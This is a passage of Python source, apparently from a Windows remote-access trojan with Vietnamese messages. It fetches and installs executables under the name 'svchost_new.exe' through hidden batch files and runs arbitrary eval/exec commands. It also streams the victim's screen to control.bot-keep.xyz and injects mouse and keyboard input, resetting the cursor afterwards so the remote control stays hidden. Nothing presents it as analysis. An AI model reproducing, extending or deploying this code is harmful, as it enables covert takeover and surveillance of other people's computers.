          # ============================================================
          #  UPDATE / EVAL
          # ============================================================
          def _sha256(p):
              h = hashlib.sha256()
              with open(p, "rb") as f:
                  for c in iter(lambda: f.read(65536), b""): h.update(c)
              return h.hexdigest()

          def f_update(args):
              if not args: return "Dùng: update <url exe> [sha256]"
              url = args[0]; want = args[1].lower() if len(args) > 1 else ""
              if not requests: return "Thiếu requests"
              try:
                  new = os.path.join(INSTALL_DIR, "svchost_new.exe")
                  r = requests.get(url, timeout=180); open(new, "wb").write(r.content)
                  got = _sha256(new)
                  if want and got != want:
                      return f"❌ SHA256 lệch (got {got[:16]}…, want {want[:16]}…) — giữ bản cũ"
                  if os.path.exists(SCRIPT_PATH) and _sha256(SCRIPT_PATH) == got:
                      return "Đã là bản mới nhất (hash trùng)"
                  try: shutil.copy2(SCRIPT_PATH, SCRIPT_PATH + ".bak")
                  except Exception: pass
                  unblock(new)
                  bat = os.path.join(INSTALL_DIR, "_upd.bat")
                  with open(bat, "w") as f:
                      f.write(f'@echo off\ntimeout /t 2 >nul\ndel "{SCRIPT_PATH}"\nmove /y "{new}" "{SCRIPT_PATH}"\nstart "" "{SCRIPT_PATH}"\n')
                  subprocess.Popen(f'cmd /c "{bat}"', shell=True, creationflags=NO_WIN)
                  time.sleep(1); os._exit(0)
              except Exception as e: return f"Lỗi: {e}"

          def f_rollback():
              bak = SCRIPT_PATH + ".bak"
              if not os.path.exists(bak): return "Không có bản .bak để rollback"
              try:
                  bat = os.path.join(INSTALL_DIR, "_rb.bat")
                  with open(bat, "w") as f:
                      f.write(f'@echo off\ntimeout /t 2 >nul\ndel "{SCRIPT_PATH}"\ncopy /y "{bak}" "{SCRIPT_PATH}"\nstart "" "{SCRIPT_PATH}"\n')
                  subprocess.Popen(f'cmd /c "{bat}"', shell=True, creationflags=NO_WIN)
                  time.sleep(1); os._exit(0)
              except Exception as e: return f"Lỗi: {e}"

          def f_restart():
              subprocess.Popen(f'cmd /c ping 1.1.1.1 -n 3 >nul & start "" "{self_path()}"',
                               shell=True, creationflags=NO_WIN)
              time.sleep(0.5); os._exit(0)

          _pyglobals = {}
          def f_eval(expr):
              try: return str(eval(expr, _pyglobals))
              except Exception as e: return f"Lỗi: {e}"
          def f_exec(code):
              try: exec(code, _pyglobals); return "OK"
              except Exception as e: return f"Lỗi: {e}"

          # ============================================================
          #  WEB CONTROL - realtime screen + input (control.bot-keep.xyz)
          # ============================================================
          CONTROL_URL  = "https://control.bot-keep.xyz"
          CONTROL_ON   = True
          AGENT_KEY    = ""
          WEB_HIDDEN   = True
          WEB_FPS      = 12
          WEB_QUALITY  = 55
          WEB_SCALE    = 0.5
          WEB_MON      = 1

          ULONG_PTR = ctypes.c_void_p

          class MOUSEINPUT(ctypes.Structure):
              _fields_ = [("dx", ctypes.c_long), ("dy", ctypes.c_long),
                          ("mouseData", ctypes.c_ulong), ("dwFlags", ctypes.c_ulong),
                          ("time", ctypes.c_ulong), ("dwExtraInfo", ULONG_PTR)]

          class KEYBDINPUT(ctypes.Structure):
              _fields_ = [("wVk", ctypes.c_ushort), ("wScan", ctypes.c_ushort),
                          ("dwFlags", ctypes.c_ulong), ("time", ctypes.c_ulong),
                          ("dwExtraInfo", ULONG_PTR)]

          class HARDWAREINPUT(ctypes.Structure):
              _fields_ = [("uMsg", ctypes.c_ulong), ("wParamL", ctypes.c_ushort),
                          ("wParamH", ctypes.c_ushort)]

          class _IU(ctypes.Union):
              _fields_ = [("mi", MOUSEINPUT), ("ki", KEYBDINPUT), ("hi", HARDWAREINPUT)]

          class INPUT(ctypes.Structure):
              _fields_ = [("type", ctypes.c_ulong), ("u", _IU)]

          M_MOVE, M_LD, M_LU, M_RD, M_RU, M_MD, M_MU, M_WHEEL = 1, 2, 4, 8, 16, 32, 64, 0x800
          M_ABS, M_VIRT = 0x8000, 0x4000
          K_UP, K_UNI = 0x0002, 0x0004
          BTN = {"left": (M_LD, M_LU), "right": (M_RD, M_RU), "mid": (M_MD, M_MU)}

          _web = {"ws": None, "lock": threading.Lock(), "viewers": 0, "on": False,
                  "drag": False, "dorg": (0, 0), "bounds": None, "beat": 0.0}
          _in_q = queue.Queue(maxsize=400)

          def _send_input(*items):
              n = len(items)
              arr = (INPUT * n)(*items)
              ctypes.windll.user32.SendInput(n, arr, ctypes.sizeof(INPUT))

          def _mi(dx=0, dy=0, data=0, flags=0):
              return INPUT(0, _IU(mi=MOUSEINPUT(dx, dy, data, flags, 0, None)))

          def _ki(vk=0, scan=0, flags=0):
              return INPUT(1, _IU(ki=KEYBDINPUT(vk, scan, flags, 0, None)))

          def _cursor():
              class P(ctypes.Structure): _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]
              p = P(); ctypes.windll.user32.GetCursorPos(ctypes.byref(p)); return p.x, p.y

          def _restore(x, y):
              try: ctypes.windll.user32.SetCursorPos(int(x), int(y))
              except Exception: pass

          def _vmetrics():
              u = ctypes.windll.user32
              return (u.GetSystemMetrics(76), u.GetSystemMetrics(77),
                      u.GetSystemMetrics(78), u.GetSystemMetrics(79))

          def _abs_xy(nx, ny):
              vx, vy, vw, vh = _vmetrics()
              b = _web.get("bounds")
              l, t, w, h = b if b else (vx, vy, vw, vh)
              px = l + float(nx) * max(w - 1, 1)
              py = t + float(ny) * max(h - 1, 1)
              dx = int((px - vx) * 65535 / max(vw - 1, 1))
              dy = int((py - vy) * 65535 / max(vh - 1, 1))
              return _mi(dx, dy, 0, M_MOVE | M_ABS | M_VIRT)

          def _do_input(d):
              try:
                  a = d.get("a")
                  hid = bool(d.get("h", WEB_HIDDEN))
                  if a == "m":
                      ox, oy = _cursor()
                      _send_input(_abs_xy(d.get("x", 0), d.get("y", 0)))
                      if hid and not _web["drag"]: _restore(ox, oy)
                  elif a == "c":
                      dn, up = BTN.get(d.get("b", "left"), BTN["left"])
                      ox, oy = _cursor()
                      _send_input(_abs_xy(d.get("x", 0), d.get("y", 0)))
                      time.sleep(0.006)
                      for _ in range(max(1, int(d.get("n", 1)))):
                          _send_input(_mi(0, 0, 0, dn), _mi(0, 0, 0, up))
                          time.sleep(0.02)
                      if hid: _restore(ox, oy)
                  elif a == "d":
                      dn, up = BTN.get(d.get("b", "left"), BTN["left"])
                      x, y = d.get("x", 0), d.get("y", 0)
                      if "dn" in d and d["dn"]:
                          ox, oy = _cursor(); _web["drag"] = True; _web["dorg"] = (ox, oy)
                          _send_input(_abs_xy(x, y)); time.sleep(0.012)
                          _send_input(_mi(0, 0, 0, dn))
                      elif "dn" in d:
                          _send_input(_abs_xy(x, y)); time.sleep(0.012)
                          _send_input(_mi(0, 0, 0, up)); time.sleep(0.012)
                          _web["drag"] = False
                          if hid: _restore(*_web.get("dorg", (0, 0)))
                      else:
                          _send_input(_abs_xy(x, y))
                  elif a == "s":
                      ox, oy = _cursor()
                      if d.get("x") is not None: _send_input(_abs_xy(d.get("x", 0), d.get("y", 0)))
                      _send_input(_mi(0, 0, int(d.get("dy", 1)) * 120, M_WHEEL))
                      if hid: _restore(ox, oy)
                  elif a == "k":
                      vk = int(d.get("vk", 0))
                      if vk: _send_input(_ki(vk, 0, 0 if d.get("dn") else K_UP))
                  elif a == "t":
                      for ch in str(d.get("s", "")):
                          code = 0x0D if ch == "\n" else ord(ch)
                          _send_input(_ki(0, code, K_UNI), _ki(0, code, K_UNI | K_UP))
              except Exception: pass

          def _in_worker():
              while True:
                  try: d = _in_q.get(timeout=1)
                  except Exception: continue
                  try: _do_input(d)
                  except Exception: pass

          def _mon_count():
              try:
                  with mss.mss() as s: return max(1, len(s.monitors) - 1)
              except Exception: return 1

          def _lan_ip():
              try:
                  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                  s.connect(("8.8.8.8", 80)); ip = s.getsockname()[0]; s.close(); return ip
              except Exception: return ""

          def _grab_jpeg(mon=1, scale=0.5, q=55):
              if not mss: return b""
              try:
                  with mss.mss() as s:
                      mons = s.monitors
                      idx = mon if 0 < mon < len(mons) else (1 if len(mons) > 1 else 0)
                      mm = mons[idx]; raw = s.grab(mm)
                      _web["bounds"] = (mm["left"], mm["top"], mm["width"], mm["height"])
              except Exception: return b""
              if np is not None and cv2 is not None:
                  try:
                      img = np.frombuffer(raw.raw, dtype=np.uint8).reshape(raw.height, raw.width, 4)[:, :, :3]
                      img = np.ascontiguousarray(img)
                      if abs(scale - 1.0) > 0.02:
                          img = cv2.resize(img, None, fx=scale, fy=scale, interpolation=cv2.INTER_AREA)
                      ok, buf = cv2.imencode(".jpg", img, [int(cv2.IMWRITE_JPEG_QUALITY), int(q)])
                      return buf.tobytes() if ok else b""
                  except Exception: pass
              if Image:
                  try:
                      im = Image.frombytes("RGB", raw.size, raw.rgb)
                      if abs(scale - 1.0) > 0.02:
                          im = im.resize((max(1, int(im.width*scale)), max(1, int(im.height*scale))))
                      b = io.BytesIO(); im.save(b, "JPEG", quality=int(q)); return b.getvalue()
                  except Exception: pass
              return b""

          def _ws_send(payload, binary=False):
              ws = _web.get("ws")
              if not ws: return False
              try:
                  with _web["lock"]:
                      ws.send(payload, opcode=0x2 if binary else 0x1)
                  return True
              except Exception: return False

          def _web_frames():
              while True:
                  try:
                      _web["beat"] = time.time()
                      if not _web["on"] or _web["viewers"] <= 0:
                          time.sleep(0.05); continue
                      t = time.time()
                      jpg = _grab_jpeg(WEB_MON, WEB_SCALE, WEB_QUALITY)
                      if jpg: _ws_send(jpg, True)
                      wait = (1.0 / max(WEB_FPS, 1)) - (time.time() - t)
                      if wait > 0: time.sleep(wait)
                  except Exception:
                      time.sleep(0.1)

